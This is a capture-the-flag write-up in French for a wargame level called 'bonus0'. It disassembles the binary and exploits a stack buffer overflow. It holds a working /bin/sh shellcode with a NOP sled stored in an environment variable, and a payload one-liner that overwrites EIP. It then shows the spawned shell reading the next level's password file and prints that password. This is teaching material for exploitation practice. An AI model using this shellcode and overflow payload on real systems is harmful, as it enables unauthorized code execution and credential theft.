## Démarches

- `objdump -d bonus0`
  ```
    080484b4 <p>:
        80484b4:	55                   	push   %ebp
        80484b5:	89 e5                	mov    %esp,%ebp
        80484b7:	81 ec 18 10 00 00    	sub    $0x1018,%esp
        80484bd:	8b 45 0c             	mov    0xc(%ebp),%eax
        80484c0:	89 04 24             	mov    %eax,(%esp)
        80484c3:	e8 e8 fe ff ff       	call   80483b0 <puts@plt>
        80484c8:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
        80484cf:	00
        80484d0:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
        80484d6:	89 44 24 04          	mov    %eax,0x4(%esp)
        80484da:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
        80484e1:	e8 9a fe ff ff       	call   8048380 <read@plt>
        80484e6:	c7 44 24 04 0a 00 00 	movl   $0xa,0x4(%esp)
        80484ed:	00
        80484ee:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
        80484f4:	89 04 24             	mov    %eax,(%esp)
        80484f7:	e8 d4 fe ff ff       	call   80483d0 <strchr@plt>
        80484fc:	c6 00 00             	movb   $0x0,(%eax)
        80484ff:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
        8048505:	c7 44 24 08 14 00 00 	movl   $0x14,0x8(%esp)
        804850c:	00
        804850d:	89 44 24 04          	mov    %eax,0x4(%esp)
        8048511:	8b 45 08             	mov    0x8(%ebp),%eax
        8048514:	89 04 24             	mov    %eax,(%esp)
        8048517:	e8 d4 fe ff ff       	call   80483f0 <strncpy@plt>
        804851c:	c9                   	leave
        804851d:	c3                   	ret

    0804851e <pp>:
        804851e:	55                   	push   %ebp
        804851f:	89 e5                	mov    %esp,%ebp
        8048521:	57                   	push   %edi
        8048522:	53                   	push   %ebx
        8048523:	83 ec 50             	sub    $0x50,%esp
        8048526:	c7 44 24 04 a0 86 04 	movl   $0x80486a0,0x4(%esp)
        804852d:	08
        804852e:	8d 45 d0             	lea    -0x30(%ebp),%eax
        8048531:	89 04 24             	mov    %eax,(%esp)
        8048534:	e8 7b ff ff ff       	call   80484b4 <p>
        8048539:	c7 44 24 04 a0 86 04 	movl   $0x80486a0,0x4(%esp)
        8048540:	08
        8048541:	8d 45 e4             	lea    -0x1c(%ebp),%eax
        8048544:	89 04 24             	mov    %eax,(%esp)
        8048547:	e8 68 ff ff ff       	call   80484b4 <p>
        804854c:	8d 45 d0             	lea    -0x30(%ebp),%eax
        804854f:	89 44 24 04          	mov    %eax,0x4(%esp)
        8048553:	8b 45 08             	mov    0x8(%ebp),%eax
        8048556:	89 04 24             	mov    %eax,(%esp)
        8048559:	e8 42 fe ff ff       	call   80483a0 <strcpy@plt>
        804855e:	bb a4 86 04 08       	mov    $0x80486a4,%ebx
        8048563:	8b 45 08             	mov    0x8(%ebp),%eax
        8048566:	c7 45 c4 ff ff ff ff 	movl   $0xffffffff,-0x3c(%ebp)
        804856d:	89 c2                	mov    %eax,%edx
        804856f:	b8 00 00 00 00       	mov    $0x0,%eax
        8048574:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
        8048577:	89 d7                	mov    %edx,%edi
        8048579:	f2 ae                	repnz scas %es:(%edi),%al
        804857b:	89 c8                	mov    %ecx,%eax
        804857d:	f7 d0                	not    %eax
        804857f:	83 e8 01             	sub    $0x1,%eax
        8048582:	03 45 08             	add    0x8(%ebp),%eax
        8048585:	0f b7 13             	movzwl (%ebx),%edx
        8048588:	66 89 10             	mov    %dx,(%eax)
        804858b:	8d 45 e4             	lea    -0x1c(%ebp),%eax
        804858e:	89 44 24 04          	mov    %eax,0x4(%esp)
        8048592:	8b 45 08             	mov    0x8(%ebp),%eax
        8048595:	89 04 24             	mov    %eax,(%esp)
        8048598:	e8 f3 fd ff ff       	call   8048390 <strcat@plt>
        804859d:	83 c4 50             	add    $0x50,%esp
        80485a0:	5b                   	pop    %ebx
        80485a1:	5f                   	pop    %edi
        80485a2:	5d                   	pop    %ebp
        80485a3:	c3                   	ret

    080485a4 <main>:
        80485a4:	55                   	push   %ebp
        80485a5:	89 e5                	mov    %esp,%ebp
        80485a7:	83 e4 f0             	and    $0xfffffff0,%esp
        80485aa:	83 ec 40             	sub    $0x40,%esp
        80485ad:	8d 44 24 16          	lea    0x16(%esp),%eax
        80485b1:	89 04 24             	mov    %eax,(%esp)
        80485b4:	e8 65 ff ff ff       	call   804851e <pp>
        80485b9:	8d 44 24 16          	lea    0x16(%esp),%eax
        80485bd:	89 04 24             	mov    %eax,(%esp)
        80485c0:	e8 eb fd ff ff       	call   80483b0 <puts@plt>
        80485c5:	b8 00 00 00 00       	mov    $0x0,%eax
        80485ca:	c9                   	leave
        80485cb:	c3                   	ret
  ```
    - On peut observer que le `main` appelle une fonction `pp`, puis un `puts`
    - La fonction `pp` fait appel à la fonction `p` 2 fois puis concatène avec `strcat`
    - La fonction `p` utilise `puts`, `read`, `strnchr` et `strncpy`


- Au lancement, le programme nous demande de saisir des strings sur l'entrée standard à 2 reprises, puis concatène les 2 chaines et les imprime. Si les 2 chaines sont trop longues, le programme segfault.
  
- Avec gdb et peda, on peut déterminer que pour chaque chaine, la longueur prévue est de 20 caractères, et le read en lit 4096.
  
- On peut utilise un shellcode (cf level2) pour écrire sur l'eip et appeler un shell
  - On enregistre le shellcode dans l'environnement (plus 200+ intructions NOP pour avoir de la marge)
    ```
    export SHELLCODE=`python -c 'print("\x90"*240+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")'`
    ```
  
  - Dans gdb, on récupère l'adresse de la variable avec `x/s *((char **)environ)`
    > 0xbffff7c4

<!-- r < <( python -c 'print("A"*4095+"\n"+"\x90"*9+"\xc4\xf7\xff\xbf"+20*"B")') -->

  - On remplit le premier read afin d'accèder au second en une seule instruction, puis on ajoute l'adresse du shellcode
    `(python -c 'print("A"*4095+"\n"+"\x90"*9+"\xc4\xf7\xff\xbf"+20*"B")' ; cat -) | ./bonus0`
      ```
      AAAAAAAAAAAAAAAAAAAA�������������BBBBBBB�� �������������BBBBBBB��
      pwd
      /home/user/bonus0
      cat /home/user/bonus1/.pass
      cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
      exit
      ```

<br>
----
## Ressources